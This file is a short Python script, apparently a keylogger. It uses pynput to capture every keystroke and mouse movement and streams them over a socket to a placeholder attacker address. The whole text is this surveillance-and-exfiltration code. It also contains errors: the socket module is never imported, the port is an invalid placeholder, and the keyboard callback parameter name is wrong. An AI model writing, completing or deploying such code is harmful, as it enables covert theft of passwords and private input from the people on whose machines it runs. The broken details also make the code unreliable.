import pynput
from pynput.mouse import Listener
from pynput.keyboard import Listener as KeyboardListener

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Set up the connection details
host = 'YOUR_IP_ADDRESS_HERE'
port = YOUR_PORT_NUMBER

# Start connecting to the host
s.connect((host, port))

def start_listening():
    # Mouse Listener
    mouse_listener = Listener(on_move=on_mouse_move)
    mouse_listener.start()

    # Keyboard Listener
    keyboard_listener = KeyboardListener(on_key_down=on_key_down)
    keyboard_listener.start()

    while True:
        pass

def on_mouse_move(x, y):
    # Send the position of the mouse to the server
    s.send(f"({x},{y})".encode())

def on_key_down(key):
    # Send which key was pressed to the server
    s.send(str(key).encode())

start_listening()
